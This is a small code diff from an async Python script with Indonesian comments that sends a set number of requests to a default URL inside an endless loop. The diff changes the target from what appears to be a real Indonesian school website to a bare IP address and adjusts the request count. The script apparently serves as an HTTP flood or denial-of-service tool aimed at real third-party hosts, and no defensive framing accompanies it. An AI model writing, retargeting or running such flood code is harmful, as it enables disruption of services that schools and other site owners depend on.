@@ -31,8 +31,8 @@ async def send_request(url):
         return None
 
 async def main():
-    default_url = 'http://www.smknulasem.sch.id'  # URL default
-    num_requests = 10000  # Jumlah permintaan yang ingin Anda kirim
+    default_url = 'https://38.242.194.12'  # URL default
+    num_requests = 1000  # Jumlah permintaan yang ingin Anda kirim
 
     while True:
         # Inisialisasi list untuk menyimpan hasil respons
